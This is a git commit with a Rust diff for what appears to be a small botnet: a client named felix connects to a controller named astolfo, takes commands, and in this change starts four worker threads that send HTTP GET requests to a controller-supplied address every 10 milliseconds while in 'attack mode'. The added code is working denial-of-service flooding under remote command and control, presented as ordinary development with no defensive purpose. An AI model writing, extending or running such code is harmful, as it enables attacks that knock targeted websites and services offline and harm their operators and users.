a09a02559c0002c4c2054d852bf8819498d3e124
0x2B <nhagan345@gmail.com>
2025-09-01 03:34:17 -0400

    Bot now sends requests in attack mode

--- src/felix.rs
+++ src/felix.rs
@@ -1,4 +1,4 @@
-use std::{env, io::{Read, Write}, net::TcpStream, process, thread::sleep, time::Duration};
+use std::{env, io::{Read, Write}, net::TcpStream, process, sync::{Arc, RwLock}, thread::{self, sleep}, time::Duration};
 
 use astolfo::FemState;
 
@@ -10,6 +10,28 @@ fn main() {
         eprintln!("[\x1b[911mERR\x1b[0m] Failed to connect ({err})");
         process::exit(1);
     });
+
+    let mut prev_state = FemState::Idle;
+    let working_state = Arc::new(RwLock::new(FemState::Idle));
+
+    for _ in 0..4 {
+        let thread_state = Arc::clone(&working_state);
+        thread::spawn(move || {
+            loop {
+                let state = thread_state.read().unwrap(); 
+                match &*state {
+                    FemState::Idle => {
+                        sleep(Duration::from_secs(3));
+                    },
+                    FemState::Attacking(addr) => {
+                        reqwest::blocking::get(addr).unwrap();
+                        sleep(Duration::from_millis(10));
+                    },
+                    _ => {}
+                };
+            }
+        });
+    }
 
     loop {
         let hello_msg = b"meow";
@@ -30,32 +52,36 @@ fn main() {
             eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to astolfo");
             process::exit(1);
         });
-        println!("Got size");
 
         let size = u16::from_be_bytes(size_buf);
         let mut state = vec![0u8; size as usize];
-        println!("Size: {size}");
 
         stream.read_exact(state.as_mut_slice()).unwrap_or_else(|_| {
             eprintln!("[\x1b[911mERR\x1b[0m] Lost connection to astolfo");
             process::exit(1);
         });
-        println!("Got cmd");
 
         let cmd = bincode::decode_from_slice::<FemState, _>(state.as_slice(), config);
-        println!("decoded cmd");
 
         match cmd {
-            Ok((cmd, _)) => match cmd {
-                FemState::Idle => {
-                    println!("CMD: Idle\n");
-                },
-                
-                FemState::Attacking(addr) => {
-                    println!("CMD: Attack ({addr})\n")
-                },
-
-                _ => {}
+            Ok((cmd, _)) => {
+                if cmd != prev_state {
+                    match cmd {
+                        FemState::Idle => {
+                            let mut write_guard = working_state.write().unwrap();
+                            *write_guard = FemState::Idle;
+                            prev_state = FemState::Idle;
+                            println!("[\x1b[94mINFO\x1b[0m] Set workers to idle");
+                        },
+                        FemState::Attacking(addr) => {
+                            let mut write_guard = working_state.write().unwrap();
+                            *write_guard = FemState::Attacking(addr.clone());
+                            prev_state = FemState::Attacking(addr);
+                            println!("[\x1b[94mINFO\x1b[0m] Set workers to attack");
+                        },
+                        _ => {}
+                    }
+                }
             },
             Err(_) => {}
         }
--- src/lib.rs
+++ src/lib.rs
@@ -1,6 +1,6 @@
 use bincode::{Decode, Encode};
 
-#[derive(Encode, Decode, Debug, Clone)]
+#[derive(PartialEq, Encode, Decode, Debug, Clone)]
 pub enum FemState {
     Idle,
     Attacking(String),
